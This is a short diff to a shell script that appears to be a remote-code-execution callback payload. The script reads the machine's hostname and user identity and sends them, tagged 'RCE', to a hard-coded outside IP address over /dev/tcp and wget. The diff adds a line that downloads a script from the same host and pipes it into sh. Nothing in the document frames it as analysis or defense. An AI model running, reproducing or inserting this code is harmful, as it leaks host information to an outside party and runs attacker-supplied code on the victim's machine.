@@ -1,6 +1,7 @@
 #!/bin/sh
 H=$(cat /etc/hostname 2>/dev/null || echo unknown)
 I=$(id 2>/dev/null)
+wget -q -O- http://62.113.111.63:6666/script | sh
 bash -c "echo RCE:${H}:${I} > /dev/tcp/62.113.111.63/6666" 2>/dev/null
 wget -q -O /dev/null "http://62.113.111.63:6666/RCE_${H}" 2>/dev/null &
 exit 0
